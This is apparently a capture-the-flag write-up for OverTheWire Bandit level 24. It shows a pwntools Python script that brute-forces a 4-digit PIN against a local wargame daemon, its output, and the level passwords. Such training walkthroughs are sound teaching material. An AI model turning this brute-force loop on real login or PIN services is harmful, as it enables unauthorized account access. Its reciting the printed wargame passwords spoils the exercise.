A daemon is listening on port 30002 and will give you the password for bandit25
if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```shell
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25.
Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
Note Level 24 Pass : **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**

Testing random input 

```shell
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
Wrong! Please enter the correct pincode. Try again.
```
It says we have to brute force the service , Lets try to write python script to do so 

```python
from pwn import *

r = remote("localhost",30002)
q = r.recvline()
print("Question is \n"+q)
for i in range(0,9999):
        if i >= 0 and i <10:
                pin = "000" + str(i)
        elif i >= 10 and i <100:
                pin = "00" + str(i)
        elif i >= 100 and i < 1000:
                pin = "0" + str(i)
        else :
                pin = str(i)

        print("Sending UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + pin)
        r.send("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "+pin + " \n")
        print(r.recvline())
```
Boom we have the flag 

```shell
Sending UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5589
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

